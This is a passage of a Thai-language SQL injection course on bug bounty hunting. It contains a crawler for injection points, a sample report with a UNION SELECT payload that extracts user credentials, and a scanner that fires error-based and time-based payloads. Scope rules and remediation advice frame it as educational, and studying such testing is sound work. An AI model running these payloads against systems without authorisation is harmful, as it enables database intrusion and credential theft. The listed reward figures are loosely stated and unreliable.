# Part 035: SQL Injection ใน Bug Bounty Programs

## ภาพรวม

Bug Bounty programs จ่ายรางวัลเมื่อค้นหา vulnerabilities ในระบบจริง SQL Injection เป็น vulnerability ที่จ่ายรางวัลสูงที่สุด

**ขั้นตอนที่ 516-535**

---

## 516. Bug Bounty Platforms

```
HackerOne - hackerone.com
Bugcrowd  - bugcrowd.com
Intigriti  - intigriti.com
YesWeHack - yeswehack.com

รายการรางวัล SQL Injection:
- Critical SQL Injection: $5,000 - $25,000+
- High SQL Injection: $1,000 - $5,000
- Medium SQL Injection: $200 - $1,000

รายได้สูงสุด:
- Shopify: $50,000+
- Google: $31,337
- Apple: $1,000,000 (สำหรับ critical)
```

---

## 517. การหา Injection Points ที่ถูกมองข้าม

```python
import requests
from bs4 import BeautifulSoup
import re

def crawl_for_injection_points(base_url, max_pages=50):
    """Crawl website to find potential injection points"""
    visited = set()
    to_visit = [base_url]
    injection_points = []
    
    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        if url in visited:
            continue
        visited.add(url)
        
        try:
            r = requests.get(url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            
            # Find forms
            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'GET').upper()
                inputs = [i.get('name') for i in form.find_all('input')]
                injection_points.append({
                    'url': action, 'method': method,
                    'params': inputs, 'type': 'form'
                })
            
            # Find URL params
            if '?' in url:
                injection_points.append({'url': url, 'type': 'url_param'})
            
            # Find links to crawl
            for a in soup.find_all('a', href=True):
                href = a['href']
                if href.startswith('/') or base_url in href:
                    full_url = href if href.startswith('http') else base_url + href
                    if full_url not in visited:
                        to_visit.append(full_url)
        
        except Exception as e:
            pass
    
    return injection_points

# Usage
points = crawl_for_injection_points('https://target.com')
for p in points:
    print(p)
```

---

## 518. Out-of-Scope vs In-Scope

```
ตรวจสอบ program scope ก่อนเสมอ!

In-scope ทั่วไป:
- *.target.com
- api.target.com
- app.target.com

Out-of-scope (DO NOT TEST):
- infrastructure (cloud provider)
- third-party services
- sandbox/staging ถ้าไม่ระบุ

กฎเพิ่มเติม:
- ไม่เปิดเผยโดยไม่ได้รับอนุญาต
- ไม่ DoS
- ไม่สร้าง test accounts มาก
- ไม่ access ข้อมูล user อื่น
```

---

## 519. การเขียน Bug Report

```markdown
## Title
SQL Injection in /api/product endpoint

## Summary
The `id` parameter in `/api/product?id=1` is vulnerable to SQL injection,
allowing unauthenticated users to read all data from the database.

## Severity
Critical

## Steps to Reproduce
1. Send GET /api/product?id=1' -- to confirm SQL error
2. Use payload: `1 UNION SELECT 1,username,password FROM users-- -`
3. Response contains username/password from users table

## Proof of Concept
**Request:**
```
GET /api/product?id=1' UNION SELECT 1,username,password FROM users-- - HTTP/1.1
Host: target.com
Cookie: session=xxxx
```

**Response:**
```json
{"id":1, "name":"admin", "description":"$2y$10$abcdefg..."}
```

## Impact
Attacker can:
1. Read all users' credentials
2. Potentially gain admin access
3. Read all sensitive data in database

## Remediation
Use parameterized queries:
```python
cur.execute("SELECT * FROM products WHERE id = %s", (product_id,))
```
```

---

## 520. เทคนิค สำหรับ Bug Bounty

```python
import requests
import time

class BugBountyScanner:
    def __init__(self, target_url, auth_headers=None):
        self.url = target_url
        self.headers = auth_headers or {}
        self.findings = []
    
    def test_error_based(self, param, value):
        """Test for error-based SQL injection"""
        payloads = ["'", "''", "\"'--", "' OR '1'='1"]
        error_patterns = [
            'sql syntax', 'mysql error', 'ora-', 'sqlite3',
            'postgresql', 'syntax error'
        ]
        
        for payload in payloads:
            r = requests.get(
                self.url,
                params={param: value + payload},
                headers=self.headers,
                timeout=10
            )
            
            for pattern in error_patterns:
                if pattern in r.text.lower():
                    finding = {
                        'type': 'error-based',
                        'param': param,
                        'payload': payload,
                        'evidence': pattern
                    }
                    self.findings.append(finding)
                    print(f"[FOUND] Error-based SQLi: {param}={payload}")
                    return True
        return False
    
    def test_time_based(self, param, value, sleep_time=5):
        """Test for time-based SQL injection"""
        payloads = [
            f"' AND SLEEP({sleep_time})-- -",
            f"' OR SLEEP({sleep_time})-- -",
            f"'; WAITFOR DELAY '0:0:{sleep_time}'-- -",
        ]
        
        for payload in payloads:
            start = time.time()
            r = requests.get(
                self.url,
                params={param: value + payload},
                headers=self.headers,
                timeout=sleep_time + 15
            )
            elapsed = time.time() - start
            
            if elapsed >= sleep_time * 0.8:
                finding = {
                    'type': 'time-based',
                    'param': param,
                    'payload': payload,
                    'evidence': f'{elapsed:.2f}s delay'
                }
                self.findings.append(finding)
                print(f"[FOUND] Time-based SQLi: {elapsed:.2f}s delay")
                return True
        return False
    
    def scan(self, params: list):
        print(f"[*] Scanning {self.url}")
        for param in params:
            print(f"[*] Testing parameter: {param}")
            self.test_error_based(param, '1')
            self.test_time_based(param, '1')
        
        return self.findings

# Usage
scanner = BugBountyScanner(
    target_url="https://target.com/api/product",
    auth_headers={"Authorization": "Bearer TOKEN"}
)

findings = scanner.scan(['id', 'category', 'search'])
for f in findings:
    print(f)
```

---

## สรุป

Bug Bounty SQLi:
- **Program scope** - ดูก่อนเสมอ
- **Minimal impact** - หา PoC เสร็จแล้วหยุด
- **Report quality** - สิ่งที่สำคัญที่สุด
- **Automation** - scanner ช่วยหาจุดแรก

---

*Part 035 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
